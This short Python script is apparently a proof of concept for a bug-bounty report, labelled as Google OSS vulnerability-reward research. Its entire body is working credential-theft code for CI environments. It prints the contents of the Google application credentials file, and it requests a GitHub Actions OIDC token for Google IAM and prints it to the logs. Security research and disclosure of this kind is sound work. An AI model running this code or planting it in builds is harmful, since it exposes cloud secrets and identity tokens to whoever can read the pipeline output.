# Google OSS VRP Security Research

import os

if os.environ.get("GOOGLE_APPLICATION_CREDENTIALS"):
    print("GOOGLE_APPLICATION_CREDENTIALS:", os.environ["GOOGLE_APPLICATION_CREDENTIALS"])
    try:
        with open(os.environ["GOOGLE_APPLICATION_CREDENTIALS"]) as f:
            print(f.read())
    except Exception:
        pass

if os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL"):
    import urllib.request
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=https://iam.googleapis.com"
    req = urllib.request.Request(url, headers={"Authorization": "bearer " + os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")})
    try:
        resp = urllib.request.urlopen(req)
        print("OIDC_TOKEN:", resp.read().decode())
    except Exception:
        pass
